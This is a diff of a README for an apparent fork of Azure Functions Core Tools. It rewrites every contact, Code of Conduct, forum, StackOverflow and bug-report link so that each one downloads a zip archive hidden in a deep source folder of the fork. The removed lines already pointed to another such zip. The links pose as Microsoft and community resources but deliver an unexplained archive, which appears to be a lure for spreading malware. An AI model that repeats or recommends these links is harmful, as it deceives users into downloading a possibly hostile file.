+This project has adopted the [Microsoft Open Source Code of Conduct](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip). For more information see the [Code of Conduct FAQ](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip) or contact [https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip) with any additional questions or comments.
 
 ## Contact Us
 
 For questions on Azure Functions or the tools, you can ask questions here:
 
-- [Azure Functions Q&A Forum](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)
-- [Azure-Functions tag on StackOverflow](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)
+- [Azure Functions Q&A Forum](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip)
+- [Azure-Functions tag on StackOverflow](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip)
 
-File bugs at [Azure Functions Core Tools repo on GitHub](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip).
+File bugs at [Azure Functions Core Tools repo on GitHub](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip).
